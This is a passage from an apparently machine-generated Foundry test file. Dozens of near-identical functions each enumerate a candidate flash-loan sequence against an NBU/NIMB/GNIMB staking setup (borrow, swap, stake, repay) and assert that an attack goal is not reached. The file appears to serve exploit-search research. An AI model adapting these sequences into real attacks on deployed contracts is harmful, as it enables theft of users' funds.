        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3330(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3331(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3332(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3333(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3334(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3335(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3336(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3337(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3338(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3339(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3340(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3341(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3342(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3343(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3344(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3345(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3346(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3347(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3348(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3349(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3350(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3351(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3352(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3353(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3354(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3355(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3356(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3357(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3358(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3359(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3360(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3361(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3362(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3363(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3364(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3365(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3366(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3367(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3368(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3369(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3370(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3371(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3372(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3373(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3374(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3375(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
